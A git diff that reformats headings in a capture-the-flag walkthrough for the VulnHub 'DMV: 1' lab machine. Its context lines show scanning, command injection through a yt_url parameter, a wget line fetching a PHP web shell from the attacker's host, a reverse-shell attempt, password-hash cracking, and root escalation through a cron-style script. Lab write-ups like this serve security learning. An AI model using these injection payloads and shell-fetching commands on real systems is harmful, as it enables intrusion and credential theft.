@@ -4,9 +4,7 @@
 Available on VulnHub: https://www.vulnhub.com/entry/dmv-1,462/
 
 
-## Walkthrough
-
-### IP Discovery
+## IP Discovery
 
 ```
 $ sudo netdiscover -r 192.168.1.0/16
@@ -29,7 +27,7 @@ xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
-### Port Scanning
+## Port Scanning
 
 ```
 $ nmap -AT4 -p- 192.168.1.183
@@ -55,7 +53,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 8.92 seconds
 ```
 
-### Web Analysis
+## Web Analysis
 
 ```
 $ dirb http://192.168.1.183
@@ -143,7 +141,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-### Service Analysis
+## Service Analysis
 
 Analysing Web service, we see a convetion service YouTubeId to MP3.\
 To understand the application I made a valid request using a valid random YouTube video ID.\
@@ -196,7 +194,7 @@ push {} /sdcard/Music/ && rm {}'
 
 The next step is to validate the possible Remote Code Executon (RCE) vulnerability.
 
-### Validating RCE Vulnerability
+## Validating RCE Vulnerability
 
 Intercepting and poisoning the `yt_url` parameter with `--exec`:
 ```
@@ -227,7 +225,7 @@ The response of this request contains the result of `id` command:
 }
 ```
 
-### Exploiting RCE
+## Exploiting RCE
 
 To better interact with this RCE I uploaded the `php_web_shell.php` file.\
 It is an PHP WEB Shell based on `https://github.com/andripwn/rce`.\
@@ -301,7 +299,7 @@ yt_url=--exec<$(wget${IFS}http://192.168.1.189:8787/php_web_shell.php)
 
 Now to use PHP Web Shell we need just access `http://192.168.1.183/php_web_shell.php`.
 
-### Reverse Shell
+## Reverse Shell
 
 First I attempt to use `netcat` to get a reverse shell, but target's `netcat` doesn't have `-e` option.
 ```
@@ -339,14 +337,14 @@ www-data@dmv:/var/www/html$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-### Flag #1
+## Flag #1
 
 ```
 www-data@dmv:/var/www/html/admin$ cat flag.txt
 flag{0d8486a0c0c42503bb60ac77f4046ed7}
 ```
 
-### SysAdmin Account
+## SysAdmin Account
 
 Looking into `/var/www/html/admin` we found `.htaccess` and `.htpasswd` configuration files:
 ```
@@ -360,7 +358,7 @@ www-data@dmv:/var/www/html/admin$ cat .htpasswd
 itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
 ```
 
-### Cracking SysAdmin Password Hash
+## Cracking SysAdmin Password Hash
 
 The password hash was easyly cracked by John The Ripper
 ```
@@ -385,7 +383,7 @@ Credentials:
 * User: **itsmeadmin**
 * Pass: **jessie**
 
-### Login with Admin Credentials
+## Login with Admin Credentials
 
 After login into `http://192.168.1.183/admin` with retrieved admin credentials, we found a "Clean Downloads" button.\
 When we press it, a `rm` command is exposed in URL as paramenter `c` content.\
@@ -403,7 +401,7 @@ http://192.168.1.183/admin/?c=id
 uid=33(www-data) gid=33(www-data) groups=33(www-data) Done :) 
 ```
 
-### Privilege Escalation
+## Privilege Escalation
 
 Walking through the machine folders, we found a `/var/www/html/tmp/clean.sh` script that runs on every "Clean Downloads" interaction.\
 To be able to remove `/var/www/html/tmp/downloads` folder, the `clean.sh` script must to run as root.\
@@ -467,7 +465,7 @@ root@dmv:/var/www/html/tmp# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### Flag #2 - Root
+## Flag #2 - Root
 
 ```
 root@dmv:~# cat /root/root.txt
